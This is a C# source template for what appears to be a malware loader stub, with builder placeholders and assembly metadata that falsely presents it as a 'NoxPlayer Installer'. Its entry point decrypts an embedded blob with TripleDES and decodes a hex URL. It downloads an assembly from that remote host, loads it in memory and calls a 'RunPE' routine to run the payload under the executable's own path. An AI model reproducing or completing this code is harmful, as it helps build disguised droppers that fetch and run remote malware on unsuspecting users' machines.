using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


 [assembly: AssemblyTitle("NoxPlayer Installer")]
 [assembly: AssemblyDescription("NoxPlayer Installer")]
 [assembly: AssemblyCompany("Duodian Technology Co. Ltd.")]
 [assembly: AssemblyProduct("NoxPlayer")]
 [assembly: AssemblyCopyright("Copyright (C) 2021 Duodian Online Inc. All rights reserved.")]
 [assembly: AssemblyFileVersion("7.0.1.5")]


namespace %5%
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            byte[] %14% = { %Server% };

            byte[] %13% = (byte[])%1%(ref %14%, ref %2%);

            object %12% = new object[] { Application.ExecutablePath, string.Empty, %13%, true };

            byte[] %11% = %4%("".Replace("{", " "));

            string %10% = Encoding.ASCII.GetString(%11%);

            var %9% = new WebClient().DownloadData(%10%);

            var %7% = BindingFlags.InvokeMethod;

            Assembly %8% = Assembly.Load(%9%);

            %8%.GetType("RunPE Name .RunPE Module Name").InvokeMember("RunPE Run Function", %7%, null, null, (object[])%12%);





        }
        public static string %2% = "%Password%";


        public static object %1%(ref byte[] %16%, ref string %17%)
        {
            MD5CryptoServiceProvider %18% = new MD5CryptoServiceProvider();
            byte[] %15% = %18%.ComputeHash(Encoding.Unicode.GetBytes(%17%));
            return new TripleDESCryptoServiceProvider
            {
                Key = %15%,
                Mode = CipherMode.ECB
            }.CreateDecryptor().TransformFinalBlock(%16%, 0, %16%.Length);
        }



        public static byte[] %4%(string %17%)
        {
            %17% = %17%.Replace(" ", "");
            byte[] %18% = new byte[%17%.Length / 2];
            for (int %19% = 0; %19% < %18%.Length; %19%++)
            {
                %18%[%19%] = Convert.ToByte(%17%.Substring(%19% * 2, 2), 16);
            }
            return %18%;
        }

    }
}
